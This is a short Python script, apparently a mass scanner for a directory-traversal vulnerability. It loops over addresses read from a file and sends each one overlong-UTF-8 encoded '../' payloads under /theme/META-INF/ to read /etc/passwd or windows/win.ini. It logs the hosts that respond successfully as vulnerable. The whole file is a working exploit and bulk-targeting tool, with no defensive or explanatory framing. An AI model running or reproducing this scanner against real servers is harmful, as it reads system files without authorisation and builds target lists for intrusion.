import requests
import time

payload_linux='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
payload_windows='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'

for ip in open('ip.txt'):
    ip=ip.replace('\n','')
    try:
        data_linux=requests.get(ip+payload_linux).status_code
        data_windows=requests.get(ip+payload_windows).status_code
        print("check--->"+ip)
        if data_linux ==200:
            with open(r'vuln.txt','a+') as f:
                f.write('Linux:'+ip+'\n')
                f.close()
        elif data_windows == 200:
            with open(r'vuln.txt','a+') as f:
                f.write('Windows:'+ip+'\n')
                f.close()
        # time.sleep(0.5)
    except Exception as e:
        pass